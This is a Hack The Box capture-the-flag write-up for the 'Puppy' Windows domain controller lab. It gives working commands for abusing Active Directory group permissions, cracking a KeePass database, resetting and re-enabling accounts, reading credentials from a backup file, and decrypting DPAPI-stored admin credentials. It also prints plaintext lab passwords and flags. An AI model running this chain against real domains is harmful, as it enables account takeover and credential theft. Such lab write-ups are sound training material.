**Author:** Faridd

# HTB Write-Up: Puppy

| Field      | Details                                                          |
|------------|-------------------------------------------------------------------|
| Platform   | Hack The Box                                                     |
| Difficulty | Medium                                                           |
| OS         | Windows                                                          |
| Date       | November 1, 2026                                                 |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration — BloodHound & Group Membership Abuse](#2-enumeration--bloodhound--group-membership-abuse)
3. [Lateral Movement — DEV Share, KeePass Cracking & Account Takeover](#3-lateral-movement--dev-share-keepass-cracking--account-takeover)
4. [Lateral Movement — Account Takeover via GenericAll & Disabled-Account Bypass](#4-lateral-movement--account-takeover-via-genericall--disabled-account-bypass)
5. [Privilege Escalation — Backup Share & Leaked LDAP Bind Credentials](#5-privilege-escalation--backup-share--leaked-ldap-bind-credentials)
6. [Privilege Escalation — DPAPI Credential Decryption to Domain Admin](#6-privilege-escalation--dpapi-credential-decryption-to-domain-admin)

---

## 1. Reconnaissance

Port discovery was performed with **RustScan**:

```bash
rustscan -a 10.129.232.75 --ulimit=5000
```

**Open Ports:**

| Port | Service        |
|------|----------------|
| 53   | DNS            |
| 88   | Kerberos       |
| 111  | RPCbind        |
| 135  | MSRPC          |
| 139  | NetBIOS        |
| 389  | LDAP           |
| 445  | SMB            |
| 464  | kpasswd        |
| 593  | HTTP-RPC       |
| 636  | LDAPS          |
| 2049 | NFS            |
| 3260 | iSCSI          |
| 3268 | Global Catalog |
| 3269 | Global Catalog (SSL) |
| 5985 | WinRM          |
| 9389 | AD Web Services|

The port set confirms the target is a **Domain Controller** (Kerberos, LDAP, Global Catalog, WinRM all present), domain `puppy.htb`, hostname `DC`.

### 1.1 — Fixing Clock Skew Before Kerberos Operations

Kerberos authentication is time-sensitive, so the local clock was synced to the DC before any Kerberos-dependent tooling was used:

```bash
sudo systemctl stop systemd-timesyncd
sudo systemctl disable systemd-timesyncd
sudo ntpdate 10.129.232.75
```

---

## 2. Enumeration — BloodHound & Group Membership Abuse

### 2.1 — Initial Creds & BloodHound Collection

A set of starting credentials (`levi.james:KingofAkron2025!`) was provided for this box. BloodHound data was collected to map the AD attack surface:

```bash
bloodhound-python -d puppy.htb -u levi.james -p 'KingofAkron2025!' -c All --zip -ns 10.129.232.75
```

Graph analysis revealed a usable privilege chain:

- `levi.james` is a member of the **HR** group.
- **HR** holds **GenericWrite** over the **DEVELOPERS** group.
- **DEVELOPERS** has three members: `jamie.williams`, `adam.silver` (in Remote Management Users), `ant.edwards` (in Senior Devs).
- **Senior Devs** holds **GenericAll** over `adam.silver`.

**GenericWrite** over a group lets the holder directly edit that group's `member` attribute — in practice, add or remove arbitrary members — without needing any delegated "add member" right specifically.

### 2.2 — Adding Self to DEVELOPERS

```bash
net rpc group addmem "DEVELOPERS" "levi.james" -U "puppy.htb"/"levi.james"%'KingofAkron2025!' -S "dc01.puppy.htb"
net rpc group members "DEVELOPERS" -U "puppy.htb"/"levi.james"%'KingofAkron2025!' -S "dc01.puppy.htb"
```

```
PUPPY\levi.james
PUPPY\ant.edwards
PUPPY\adam.silver
PUPPY\jamie.williams
```

`levi.james` is now a member of **DEVELOPERS**, which opens up whatever share access that group grants.

---

## 3. Lateral Movement — DEV Share, KeePass Cracking & Account Takeover

### 3.1 — Accessing the DEV Share

With the new group membership, share enumeration showed read access to a previously inaccessible share:

```bash
netexec smb 10.129.94.154 -u levi.james -p 'KingofAkron2025!' --shares
```

```
DEV             READ            DEV-SHARE for PUPPY-DEVS
```

```bash
smbclient //10.129.94.154/DEV -U 'levi.james%KingofAkron2025!'
```

```
KeePassXC-2.7.9-Win64.msi
Projects
recovery.kdbx
```

A **KeePass database** (`recovery.kdbx`) was downloaded for offline cracking.

### 3.2 — Cracking the KeePass Database

```bash
get recovery.kdbx
keepass2john recovery.kdbx > hash.txt
```

The installed `john` was too old to parse this KeePass version and was updated:

```bash
sudo apt update && sudo apt install john
keepass2john recovery.kdbx > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=KeePass
```

**Result:** master password `liverpool`.

### 3.3 — Reading the Vault

The database was opened in the GUI (`keepassxc`) with the cracked master password, revealing several stored credentials:

```
Adam   - HJKL2025!
Antony - Antman2025!
Jamie  - JamieLove2025!
Samuel - ILY2025!
Steve  - Steve2025!
```

Only `adam` and `antony` map to real domain accounts. Adam's password turned out to be wrong, but **Antony's was valid**:

```bash
netexec smb 10.129.94.154 -u ant.edwards -p 'Antman2025!' --shares
```

```
[+] PUPPY.HTB\ant.edwards:Antman2025!
DEV             READ,WRITE      DEV-SHARE for PUPPY-DEVS
```

---

## 4. Lateral Movement — Account Takeover via GenericAll & Disabled-Account Bypass

### 4.1 — Resetting adam.silver's Password

`ant.edwards` belongs to **Senior Devs**, which (per the BloodHound graph) holds **GenericAll** over `adam.silver` — full control, including the ability to reset the password outright via **bloodyAD**:

```bash
bloodyAD --host 10.129.94.154 -d puppy.htb -u ant.edwards -p 'Antman2025!' set password 'adam.silver' 'Thisisapassword123!'
```

```
[+] Password changed successfully!
```

### 4.2 — Diagnosing STATUS_ACCOUNT_DISABLED

Despite the reset, authentication failed:

```bash
netexec smb 10.129.94.154 -u adam.silver -p 'Thisisapassword123!'
# STATUS_ACCOUNT_DISABLED
```

Checking `adam.silver`'s node in BloodHound showed **`Enabled: False`** — the account is administratively disabled, which blocks logon regardless of how correct the password is.

### 4.3 — Re-enabling the Account via userAccountControl

Since GenericAll includes write access to arbitrary attributes, `userAccountControl` was set directly to `512` — the standard bitmask value for `NORMAL_ACCOUNT` (enabled, no special flags):

```bash
bloodyAD --host 10.129.94.154 -d puppy.htb -u ant.edwards -p 'Antman2025!' set object 'adam.silver' userAccountControl -v 512
```

```
[+] adam.silver's userAccountControl has been updated
```

```bash
netexec winrm 10.129.94.154 -u adam.silver -p 'Thisisapassword123!'
# [+] PUPPY.HTB\adam.silver:Thisisapassword123! (Pwn3d!)
```

### 4.4 — Shell & User Flag

```bash
evil-winrm -i 10.129.94.154 -u adam.silver -p 'Thisisapassword123!'
```

```powershell
*Evil-WinRM* PS C:\Users\adam.silver\Desktop> type user.txt
c74da4fcd7f845e16543d3e6cc82925e
```

---

## 5. Privilege Escalation — Backup Share & Leaked LDAP Bind Credentials

### 5.1 — Discovering a Backup Archive

Further host enumeration turned up a backup directory:

```powershell
cd C:\Backups
dir -force
```

```
site-backup-2024-12-30.zip
```

```powershell
download site-backup-2024-12-30.zip
```

### 5.2 — Extracting LDAP Bind Credentials

```bash
unzip site-backup-2024-12-30.zip
cat puppy/nms-auth-config.xml.bak
```

The config file contained an **LDAP bind DN and plaintext password** used by the backed-up application to authenticate against the domain:

```xml
<bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
<bind-password>ChefSteph2025!</bind-password>
```

### 5.3 — Shell as steph.cooper

```bash
evil-winrm -i 10.129.94.154 -u steph.cooper -p 'ChefSteph2025!'
```

```powershell
whoami /priv
```

`steph.cooper`'s privileges were minimal — not enough to reach the Administrator desktop directly, so the search continued for a stronger credential.

---

## 6. Privilege Escalation — DPAPI Credential Decryption to Domain Admin

### 6.1 — What DPAPI Protects and Why It Matters Here

Windows' **Data Protection API (DPAPI)** is the OS-level encryption system behind "Windows will remember this password for you" features — saved Credential Manager entries, saved RDP/VPN/Wi-Fi credentials, browser-saved passwords, and EFS keys all ultimately rely on it. DPAPI blobs aren't tied to a hardcoded key; they're encrypted with a key derived from the **logged-on user's own Windows password**, combined with machine- and user-specific secrets. This is precisely why DPAPI loot is so valuable in an AD pentest: if you can decrypt it, you get back whatever credential the *original user* chose to let Windows remember — often an account with far more privilege than the one you're currently sitting on, exactly as played out here.

DPAPI protection involves two separate encrypted artifacts, both of which were found in this engagement:

1. **A "masterkey" file** — located under `%AppData%\Microsoft\Protect\<User SID>\`. This is a randomly generated AES key, but it is itself encrypted ("wrapped") using a key derived from the user's logon password (via an intermediate step involving the user's NTLM/SHA1-derived secret and, in a domain environment, optionally a domain backup key).
2. **A "credential" blob** — located under `%AppData%\Local\Microsoft\Credentials\` (or `%AppData%\Roaming\Microsoft\Credentials\`). This is the actual saved secret (e.g. a Credential Manager entry), encrypted directly with the masterkey from step 1, not with the user's password itself.

So the decryption chain is always: **user's logon password → unwrap the masterkey → use the masterkey to decrypt the credential blob → plaintext secret.** This is why both files had to be captured, not just one — the credential blob is useless without its masterkey, and the masterkey is useless without the account's logon password, which was already in hand (`ChefSteph2025!`, recovered from the backup archive in section 5).

### 6.2 — Locating and Exfiltrating the Credential Blob

The saved credential file was found under `steph.cooper`'s profile:

```powershell
cd C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials
dir -force
```

```
DFBE70A7E5CC19A398EBF1B96859CE5D
```

Evil-WinRM's `download` failed on this file (a Ruby/WinRM client limitation on certain file attributes), so it was exfiltrated manually by Base64-encoding its raw bytes in-session and copying the text out:

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\steph.cooper\appdata\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9'))
```

The resulting Base64 blob was pasted into a local file (`cred`) on the attacking machine.

### 6.3 — Locating and Exfiltrating the Masterkey

The corresponding masterkey, named by its GUID, was located under the user's SID folder and exfiltrated the same way:

```powershell
cd C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect
dir -force
```

```
S-1-5-21-1487982659-1829050783-2281216199-1107
```

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\steph.cooper\appdata\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407'))
```

This Base64 blob was saved locally as `key`.

### 6.4 — Decrypting the Masterkey with impacket-dpapi

Both exfiltrated files were decoded from Base64 back into their original binary form:

```bash
cat key | base64 -d -w 0 > key_final
```

**impacket-dpapi**'s `masterkey` mode was then used to unwrap the masterkey, supplying the owning user's **SID** and their **logon password** — this is the step that proves why the earlier LDAP-leak credential mattered beyond just getting a shell:

```bash
impacket-dpapi masterkey -file key_final -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'
```

```
Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

### 6.5 — Decrypting the Credential Blob

With the plaintext masterkey recovered, the credential blob itself was decrypted:

```bash
cat cred | base64 -d -w 0 > cred_final
impacket-dpapi credential -file cred_final -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

```
[CREDENTIAL]
Target      : Domain:target=PUPPY.HTB
Username    : steph.cooper_adm
Unknown     : FivethChipOnItsWay2025!
```

Windows had been storing a saved domain-admin-equivalent credential (`steph.cooper_adm`) in Credential Manager — exactly the kind of high-value secret DPAPI loot is prized for, since it's the user's own saved password rather than anything that needed cracking.

### 6.6 — Domain Admin Access & Root Flag

```bash
evil-winrm -i 10.129.94.154 -u steph.cooper_adm -p 'FivethChipOnItsWay2025!'
```

```powershell
whoami /priv
```

The privilege list confirmed near-full administrative rights (`SeBackupPrivilege`, `SeDebugPrivilege`, `SeEnableDelegationPrivilege`, `SeImpersonatePrivilege`, and more all enabled).

```powershell
cd ..\..\Administrator\Desktop
type root.txt
# e30e8b5130d5d7ff49c03907b5b801a6
```
